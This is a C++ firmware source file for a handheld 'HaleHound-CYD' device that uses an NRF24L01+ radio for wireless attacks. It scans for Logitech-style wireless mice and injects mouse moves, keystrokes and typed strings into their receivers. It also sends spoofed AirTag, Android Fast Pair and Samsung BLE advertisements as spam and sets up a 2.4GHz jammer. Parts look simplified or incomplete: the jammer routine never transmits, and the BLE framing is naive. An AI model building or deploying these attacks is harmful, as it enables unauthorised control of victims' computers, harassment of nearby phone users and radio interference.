// ═══════════════════════════════════════════════════════════════════════════
// HaleHound-CYD NRF24L01+PA+LNA Implementation
// 2.4GHz Radio for Mouse Jacker, BLE Spam, and Wireless Attacks
// Created: 2026-02-06
// ═══════════════════════════════════════════════════════════════════════════

#include "nrf24_config.h"
#include <ELECHOUSE_CC1101_SRC_DRV.h>

// ═══════════════════════════════════════════════════════════════════════════
// GLOBAL OBJECTS
// ═══════════════════════════════════════════════════════════════════════════

RF24 nrf24Radio(NRF24_CE, NRF24_CSN);
NRF24Mode currentNRF24Mode = NRF24_MODE_OFF;
uint8_t mouseJackerTarget[5] = {0, 0, 0, 0, 0};

static bool nrf24Active = false;
static bool spiClaimed = false;

// ═══════════════════════════════════════════════════════════════════════════
// SPI BUS MANAGEMENT
// ═══════════════════════════════════════════════════════════════════════════

void nrf24ClaimSPI() {
    if (spiClaimed) return;

    // Make sure CC1101 is not using the bus
    #ifndef NMRF_HAT
    // Standard CYD: CC1101 CS (GPIO 27) is separate — safe to send setSidle
    // Hat: CC1101_CS == NRF24_CSN == GPIO 27 — setSidle would corrupt NRF24
    ELECHOUSE_cc1101.setSidle();
    #endif

    // Initialize SPI for NRF24
    SPI.end();
    SPI.begin(RADIO_SPI_SCK, RADIO_SPI_MISO, RADIO_SPI_MOSI, NRF24_CSN);

    spiClaimed = true;

    #if CYD_DEBUG
    Serial.println("[NRF24] SPI bus claimed");
    #endif
}

void nrf24ReleaseSPI() {
    if (!spiClaimed) return;

    // Power down NRF24
    nrf24Radio.powerDown();

    // Re-initialize SPI for CC1101
    SPI.end();
    SPI.begin(RADIO_SPI_SCK, RADIO_SPI_MISO, RADIO_SPI_MOSI, CC1101_CS);

    spiClaimed = false;

    #if CYD_DEBUG
    Serial.println("[NRF24] SPI bus released");
    #endif
}

// ═══════════════════════════════════════════════════════════════════════════
// INITIALIZATION
// ═══════════════════════════════════════════════════════════════════════════

bool nrf24Setup() {
    #if CYD_DEBUG
    Serial.println("[NRF24] Initializing...");
    Serial.println("  CE:  GPIO " + String(NRF24_CE));
    Serial.println("  CSN: GPIO " + String(NRF24_CSN));
    #endif

    nrf24ClaimSPI();

    if (!nrf24Radio.begin()) {
        #if CYD_DEBUG
        Serial.println("[NRF24] ERROR: Failed to initialize!");
        #endif
        nrf24ReleaseSPI();
        return false;
    }

    if (!nrf24Radio.isChipConnected()) {
        #if CYD_DEBUG
        Serial.println("[NRF24] ERROR: Chip not connected!");
        #endif
        nrf24ReleaseSPI();
        return false;
    }

    // Default configuration
    nrf24Radio.setPALevel(RF24_PA_MAX);
    nrf24Radio.setDataRate(RF24_1MBPS);
    nrf24Radio.setChannel(76);
    nrf24Radio.setAutoAck(false);
    nrf24Radio.disableCRC();

    nrf24Active = true;
    currentNRF24Mode = NRF24_MODE_OFF;

    #if CYD_DEBUG
    Serial.println("[NRF24] Initialized successfully");
    Serial.println("  Variant: " + String(nrf24Radio.isPVariant() ? "+PA+LNA" : "Standard"));
    #endif

    return true;
}

void nrf24Shutdown() {
    if (!nrf24Active) return;

    nrf24Radio.powerDown();
    nrf24ReleaseSPI();

    nrf24Active = false;
    currentNRF24Mode = NRF24_MODE_OFF;

    #if CYD_DEBUG
    Serial.println("[NRF24] Shutdown complete");
    #endif
}

bool nrf24IsActive() {
    return nrf24Active;
}

// ═══════════════════════════════════════════════════════════════════════════
// CHANNEL SCANNER
// ═══════════════════════════════════════════════════════════════════════════

void nrf24ScanChannels(uint8_t* results) {
    if (!nrf24Active) {
        nrf24Setup();
    }

    currentNRF24Mode = NRF24_MODE_SCANNER;

    // Set up for scanning
    nrf24Radio.setAutoAck(false);
    nrf24Radio.startListening();

    // Scan all 126 channels
    for (int ch = 0; ch < 126; ch++) {
        nrf24Radio.setChannel(ch);
        delayMicroseconds(130);  // Settling time

        // Sample multiple times
        int count = 0;
        for (int i = 0; i < 100; i++) {
            if (nrf24Radio.testRPD()) {
                count++;
            }
            delayMicroseconds(50);
        }

        results[ch] = count;
    }

    nrf24Radio.stopListening();

    #if CYD_DEBUG
    Serial.println("[NRF24] Channel scan complete");
    #endif
}

uint8_t nrf24GetBusiestChannel() {
    uint8_t results[126];
    nrf24ScanChannels(results);

    uint8_t maxChannel = 0;
    uint8_t maxValue = 0;

    for (int i = 0; i < 126; i++) {
        if (results[i] > maxValue) {
            maxValue = results[i];
            maxChannel = i;
        }
    }

    return maxChannel;
}

// ═══════════════════════════════════════════════════════════════════════════
// MOUSE JACKER
// ═══════════════════════════════════════════════════════════════════════════

// Common wireless mouse addresses to scan
static const uint8_t commonAddresses[][5] = {
    {0xAA, 0xAA, 0xAA, 0xAA, 0xAA},
    {0x55, 0x55, 0x55, 0x55, 0x55},
    {0x00, 0x00, 0x00, 0x00, 0x00},
    {0xFF, 0xFF, 0xFF, 0xFF, 0xFF}
};

bool nrf24ScanForDevices() {
    if (!nrf24Active) {
        nrf24Setup();
    }

    currentNRF24Mode = NRF24_MODE_MOUSEJACKER;

    #if CYD_DEBUG
    Serial.println("[NRF24] Scanning for wireless devices...");
    #endif

    nrf24Radio.setAutoAck(false);
    nrf24Radio.setPayloadSize(32);
    nrf24Radio.setDataRate(RF24_2MBPS);

    // Scan common channels for Logitech devices
    uint8_t logitechChannels[] = {2, 5, 8, 17, 23, 26, 29, 32, 35, 38, 41, 44, 47, 50, 53, 56, 59, 62, 65, 68, 71, 74, 77, 80};

    for (int i = 0; i < sizeof(logitechChannels); i++) {
        nrf24Radio.setChannel(logitechChannels[i]);

        // Try common addresses
        for (int j = 0; j < 4; j++) {
            nrf24Radio.openReadingPipe(0, commonAddresses[j]);
            nrf24Radio.startListening();

            delay(10);

            if (nrf24Radio.available()) {
                // Found something!
                memcpy(mouseJackerTarget, commonAddresses[j], 5);

                #if CYD_DEBUG
                Serial.print("[NRF24] Found device on channel ");
                Serial.println(logitechChannels[i]);
                #endif

                nrf24Radio.stopListening();
                return true;
            }

            nrf24Radio.stopListening();
        }
    }

    #if CYD_DEBUG
    Serial.println("[NRF24] No devices found");
    #endif

    return false;
}

bool nrf24InjectMouseMove(int8_t x, int8_t y) {
    if (!nrf24Active || currentNRF24Mode != NRF24_MODE_MOUSEJACKER) {
        return false;
    }

    // Logitech mouse packet format
    uint8_t packet[10] = {0};
    packet[0] = 0x00;  // Device type: mouse
    packet[1] = 0xC2;  // Movement report
    packet[2] = 0x00;  // Buttons
    packet[3] = x;     // X movement
    packet[4] = y;     // Y movement
    packet[5] = 0x00;  // Wheel

    nrf24Radio.stopListening();
    nrf24Radio.openWritingPipe(mouseJackerTarget);

    bool success = nrf24Radio.write(packet, 10);

    #if CYD_DEBUG
    if (success) {
        Serial.println("[NRF24] Mouse move injected: X=" + String(x) + " Y=" + String(y));
    }
    #endif

    return success;
}

bool nrf24InjectKeystroke(uint8_t key, uint8_t modifiers) {
    if (!nrf24Active || currentNRF24Mode != NRF24_MODE_MOUSEJACKER) {
        return false;
    }

    // Logitech keyboard packet format
    uint8_t packet[10] = {0};
    packet[0] = 0x00;      // Device type
    packet[1] = 0xD3;      // Keystroke report
    packet[2] = modifiers; // Modifier keys
    packet[3] = 0x00;      // Reserved
    packet[4] = key;       // Key code
    packet[5] = 0x00;      // Key 2
    packet[6] = 0x00;      // Key 3
    packet[7] = 0x00;      // Key 4

    nrf24Radio.stopListening();
    nrf24Radio.openWritingPipe(mouseJackerTarget);

    bool success = nrf24Radio.write(packet, 10);

    // Send key release
    packet[2] = 0x00;
    packet[4] = 0x00;
    delay(10);
    nrf24Radio.write(packet, 10);

    #if CYD_DEBUG
    if (success) {
        Serial.println("[NRF24] Keystroke injected: 0x" + String(key, HEX));
    }
    #endif

    return success;
}

bool nrf24InjectString(const char* str) {
    // HID keyboard scan codes for lowercase letters
    static const uint8_t keyMap[] = {
        0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A, 0x0B,  // a-h
        0x0C, 0x0D, 0x0E, 0x0F, 0x10, 0x11, 0x12, 0x13,  // i-p
        0x14, 0x15, 0x16, 0x17, 0x18, 0x19, 0x1A, 0x1B,  // q-x
        0x1C, 0x1D                                        // y-z
    };

    while (*str) {
        char c = *str++;
        uint8_t key = 0;
        uint8_t mod = 0;

        if (c >= 'a' && c <= 'z') {
            key = keyMap[c - 'a'];
        } else if (c >= 'A' && c <= 'Z') {
            key = keyMap[c - 'A'];
            mod = 0x02;  // Left Shift
        } else if (c == ' ') {
            key = 0x2C;  // Space
        } else if (c == '\n') {
            key = 0x28;  // Enter
        }

        if (key) {
            nrf24InjectKeystroke(key, mod);
            delay(20);
        }
    }

    return true;
}

// ═══════════════════════════════════════════════════════════════════════════
// BLE SPAM
// ═══════════════════════════════════════════════════════════════════════════

// BLE advertising channels (37, 38, 39 in BLE = 2, 26, 80 in NRF24)
static const uint8_t bleChannels[] = {2, 26, 80};
static bool bleSpamActive = false;
static BLESpamType currentBLESpamType = BLE_SPAM_RANDOM;

// AirTag advertisement template
static uint8_t airtag_data[] = {
    0x1E, 0xFF, 0x4C, 0x00, 0x12, 0x19, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

// Android Fast Pair template
static uint8_t fastpair_data[] = {
    0x03, 0x03, 0x2C, 0xFE,  // Service data
    0x06, 0x16, 0x2C, 0xFE,
    0x00, 0x00, 0x00         // Model ID (randomized)
};

// Samsung template
static uint8_t samsung_data[] = {
    0x02, 0x01, 0x06,
    0x1B, 0xFF, 0x75, 0x00,  // Samsung manufacturer ID
    0x42, 0x09, 0x81, 0x02,
    0x14, 0x15, 0x03, 0x21,
    0x01, 0x09, 0xEF, 0x00,
    0x00, 0x00, 0x00, 0x00
};

void nrf24StartBLESpam(BLESpamType type) {
    if (!nrf24Active) {
        nrf24Setup();
    }

    currentNRF24Mode = NRF24_MODE_BLE_SPAM;
    currentBLESpamType = type;
    bleSpamActive = true;

    // Configure for BLE
    nrf24Radio.setAutoAck(false);
    nrf24Radio.setPayloadSize(32);
    nrf24Radio.setDataRate(RF24_1MBPS);
    nrf24Radio.disableCRC();
    nrf24Radio.setPALevel(RF24_PA_MAX);
    nrf24Radio.stopListening();

    #if CYD_DEBUG
    Serial.println("[NRF24] BLE spam started: type " + String(type));
    #endif
}

void nrf24StopBLESpam() {
    bleSpamActive = false;
    currentNRF24Mode = NRF24_MODE_OFF;

    #if CYD_DEBUG
    Serial.println("[NRF24] BLE spam stopped");
    #endif
}

void nrf24SendBLEAdvert(uint8_t* data, uint8_t len) {
    if (!bleSpamActive) return;

    // Cycle through BLE advertising channels
    for (int i = 0; i < 3; i++) {
        nrf24Radio.setChannel(bleChannels[i]);

        // BLE uses specific preamble and access address
        uint8_t packet[32];
        packet[0] = 0xD6;  // BLE preamble byte (for 1Mbps)
        packet[1] = 0xBE;  // Access address
        packet[2] = 0x89;
        packet[3] = 0x8E;
        packet[4] = 0x8E;

        // Copy advertising data
        memcpy(&packet[5], data, min((int)len, 27));

        nrf24Radio.write(packet, min((int)len + 5, 32));
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// 2.4GHz JAMMER
// ═══════════════════════════════════════════════════════════════════════════

static bool jammerActive = false;
static uint8_t jammerChannel = 0xFF;

void nrf24StartJammer(uint8_t channel) {
    if (!nrf24Active) {
        nrf24Setup();
    }

    currentNRF24Mode = NRF24_MODE_JAMMER;
    jammerActive = true;
    jammerChannel = channel;

    nrf24Radio.stopListening();
    nrf24Radio.setPALevel(RF24_PA_MAX);
    nrf24Radio.setDataRate(RF24_2MBPS);
    nrf24Radio.setAutoAck(false);
    nrf24Radio.setPayloadSize(32);

    if (channel != 0xFF) {
        nrf24Radio.setChannel(channel);
    }

    #if CYD_DEBUG
    Serial.println("[NRF24] Jammer started on channel " + String(channel == 0xFF ? "ALL" : String(channel)));
    #endif
}

void nrf24StopJammer() {
    jammerActive = false;
    currentNRF24Mode = NRF24_MODE_OFF;

    #if CYD_DEBUG
    Serial.println("[NRF24] Jammer stopped");
    #endif
}

// ═══════════════════════════════════════════════════════════════════════════
// UTILITIES
// ═══════════════════════════════════════════════════════════════════════════

void nrf24SetChannel(uint8_t channel) {
    if (channel > 125) channel = 125;
    nrf24Radio.setChannel(channel);
}

void nrf24SetPower(rf24_pa_dbm_e level) {
    nrf24Radio.setPALevel(level);
}

void nrf24SetDataRate(rf24_datarate_e rate) {
    nrf24Radio.setDataRate(rate);
}

uint8_t nrf24GetChannel() {
    return nrf24Radio.getChannel();
}

bool nrf24IsPALNA() {
    return nrf24Radio.isPVariant();
}

void nrf24PrintStatus() {
    #if CYD_DEBUG
    Serial.println("═══════════════════════════════════════");
    Serial.println("         NRF24 STATUS");
    Serial.println("═══════════════════════════════════════");
    Serial.println("Active:     " + String(nrf24Active ? "YES" : "NO"));
    Serial.println("Mode:       " + String(currentNRF24Mode));
    Serial.println("Variant:    " + String(nrf24IsPALNA() ? "+PA+LNA" : "Standard"));
    Serial.println("Channel:    " + String(nrf24GetChannel()));
    Serial.println("SPI Claimed:" + String(spiClaimed ? "YES" : "NO"));
    Serial.println("═══════════════════════════════════════");
    #endif
}
